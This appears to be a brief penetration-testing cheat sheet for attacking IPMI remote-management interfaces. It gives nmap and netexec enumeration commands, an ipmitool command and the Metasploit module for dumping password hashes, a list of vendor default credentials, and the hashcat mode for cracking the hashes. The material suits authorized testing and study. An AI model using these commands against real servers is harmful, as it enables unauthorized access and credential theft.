# IPMI (Port 623 UDP)

Intelligent Platform Management Interface. Used for remote server management. Often has weak/default credentials and a known hash dumping vulnerability.

## Nmap

```bash
sudo nmap -sU -p 623 --script ipmi-version <target ip>
```

## Enumeration and Exploitation

```bash
# check IPMI version
nxc ipmi <target ip>

# dump hashes (IPMI 2.0 cipher zero vulnerability)
# this works without authentication
ipmitool -I lanplus -H <target ip> -U admin -P admin user list

# metasploit hash dump
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <target ip>
run

# default creds to try
# admin:admin
# ADMIN:ADMIN
# root:calvin (Dell iDRAC)
# root:changeme
# Administrator:changeme
```

Crack dumped hashes with hashcat mode 7300.
